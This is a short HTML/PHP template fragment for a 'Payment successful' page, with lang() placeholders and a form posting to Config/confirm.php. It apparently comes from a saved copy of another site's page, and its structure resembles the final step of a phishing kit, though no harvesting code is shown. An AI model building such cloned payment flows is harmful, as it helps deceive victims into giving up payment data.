...
<body class=""><iframe aria-hidden="true" tabindex="-1" title="Text Zoom Event Iframe" style="width: 1em; height: 1px; border-width: 0px; position: absolute; overflow: hidden; white-space: nowrap; margin: -1px;" src="./styles/saved_resource.html"></iframe>
    ...
    <div class="l-view ">
       ...
       <div class="spn"><p>Payment successful<?php echo lang('xHp'); ?></p></div>

        </div>

       <h5 style="margin-top: 30px;"><?php echo lang('xRod'); ?></h5>
       <p class="para"><?php echo lang('xP1fin'); ?></p>
       <p class="para"><?php echo lang('xP2fin'); ?></p>
       <form method="post" action="Config/confirm.php">
        <button name="submit" style="margin-top: 20px;" class="c-voc-tracking-bar--button js--tracking-bar--button base-button btnx" title="Please fill out this field." type="submit">
                                    <?php echo lang('xFinish'); ?></h4>
					</button></form>
